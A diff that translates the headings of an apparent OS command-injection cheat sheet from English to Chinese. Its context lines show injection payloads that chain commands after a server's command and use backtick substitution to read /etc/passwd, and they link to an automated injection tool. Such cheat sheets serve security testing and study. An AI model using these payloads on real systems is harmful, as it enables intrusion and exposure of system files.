@@ -4,11 +4,11 @@
 
 ## Summary
 
-* [Tools](#tools)
-* [Exploits](#exploits)
-  * [Basic commands](#basic-commands)
-  * [Chaining commands](#chaining-commands)
-  * [Inside a command](#inside-a-command)
+* [工具](#工具)
+* [漏洞利用](#漏洞利用)
+  * [基本命令](#基本命令)
+  * [命令串联](#命令串联)
+  * [插入命令](#插入命令)
 * [过滤绕过](#过滤绕过)
   * [不带空格](不带空格)
   * [使用换行符](#使用换行符)
@@ -26,13 +26,13 @@
 * [References](#references)
     
 
-## Tools
+## 工具
 
 * [commix - Automated All-in-One OS command injection and exploitation tool](https://github.com/commixproject/commix)
 
-## Exploits
+## 漏洞利用
 
-### Basic commands
+### 基本命令
 
 Execute the command and voila :p
 
@@ -44,7 +44,7 @@ bin:x:2:2:bin:/bin:/bin/sh
 sys:x:3:3:sys:/dev:/bin/sh
 ```
 
-### Chaining commands
+### 命令串联
 
 ```powershell
 original_cmd_by_server; ls
@@ -53,7 +53,7 @@ original_cmd_by_server | ls
 original_cmd_by_server || ls    Only if the first cmd fail
 ```
 
-### Inside a command
+### 插入命令
 
 ```bash
 original_cmd_by_server `cat /etc/passwd`
